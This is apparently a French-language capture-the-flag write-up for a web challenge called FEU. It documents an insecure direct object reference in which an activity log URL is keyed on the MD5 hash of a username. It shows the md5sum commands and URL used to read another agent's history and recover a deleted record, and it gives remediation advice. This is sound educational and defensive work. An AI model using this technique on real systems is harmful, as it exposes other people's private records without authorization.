# FEU

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | FEU |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Non documentée |
| Points | 300 |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | HTTP, MD5, IDOR |
| Validation | Aucune validation plateforme exportée |

## 1. Introduction

Retrouver l'identité associée à un alias et à un numéro dans une base de personnes.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

## 2. Énoncé du challenge

- Identifier le nom et le prénom correspondant à l’alias mstrand.

### Objectif

Source : [FEU.md](evidence/feu-md.txt)

Identifier le nom et le prénom correspondant à l’alias `mstrand`, à partir du numéro :

```text
+042 74 82 61 39
```

## 3. Analyse initiale

1 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

## 4. Reconnaissance et investigation

La reconnaissance conservée se limite aux fichiers décrits dans l’inventaire. Aucun journal de commandes permettant d’établir une chronologie plus fine n’a été retrouvé.

## 5. Identification du mécanisme

L’identifiant MD5 de l’utilisateur sert de clé d’accès à un historique. Le calcul du hash ne prouve aucune autorisation : le journal d’un autre agent expose les champs d’une fiche supprimée.

### Vulnérabilité : IDOR sur l’activité

Source : [FEU.md](evidence/feu-md.txt)

La page **My Activity** utilise une URL de la forme :

```text
/activity/<md5(username)>
```

Le hash du compte connecté est calculable avec :

```bash
printf '%s' '<EXPURGE>' | md5sum
```

L’historique de l’agent `khandor` est accessible en utilisant :

```bash
printf '%s' 'khandor' | md5sum
# <HEX_EXPURGE>
```

URL exploitée :

```text
https://feu.hackerlab.bj/activity/<HEX_EXPURGE>
```

Aucun contrôle d’autorisation ne vérifie que l’utilisateur connecté possède cet historique.

## 6. Exploitation ou résolution

### FEU — Writeup

Source : [FEU.md](evidence/feu-md.txt)

- **Catégorie :** Web / Misc
- **Valeur :** 300 points
- **Cible :** `https://feu.hackerlab.bj`

### Accès

Source : [FEU.md](evidence/feu-md.txt)

Les identifiants fournis étaient :

```text
Utilisateur : <EXPURGE>
Mot de passe : <EXPURGE>
```

Le mot de passe doit bien contenir la lettre `l` après `q`.

### Recherche initiale

Source : [FEU.md](evidence/feu-md.txt)

La recherche `mstrand` renvoie la fiche :

```text
PER-2025-0500
```

La fiche est largement caviardée et la recherche directe du numéro ne renvoie aucun résultat.

### Preuve

Source : [FEU.md](evidence/feu-md.txt)

Le journal de `khandor` contient une entrée de suppression révélant les champs de la fiche supprimée :

```text
Record deleted
Person · Mikkel Strandhjelm
number   +042 74 82 61 39
lastName Strandhjelm
firstName Mikkel
```

### Flag

Source : [FEU.md](evidence/feu-md.txt)

```text
<EXPURGE>
```

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Identifier le nom et le prénom correspondant à l’alias mstrand. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Aucune validation plateforme exportée |

## 9. Difficultés rencontrées

Aucune tentative infructueuse n’est consignée dans les sources rattachées. Cela ne prouve pas qu’il n’y en a pas eu. Les limites matérielles sont indiquées dans l’introduction.

## 10. Analyse technique approfondie

L’identifiant MD5 de l’utilisateur sert de clé d’accès à un historique. Le calcul du hash ne prouve aucune autorisation : le journal d’un autre agent expose les champs d’une fiche supprimée. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Vérifier l’appartenance de chaque historique à l’utilisateur authentifié ; contrôler les autorisations avant de restituer les anciennes valeurs d’une fiche.

## 12. Conclusion

Retrouver l'identité associée à un alias et à un numéro dans une base de personnes. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Aucune validation plateforme exportée.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [FEU.md](evidence/feu-md.txt) — origine : `FEU.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

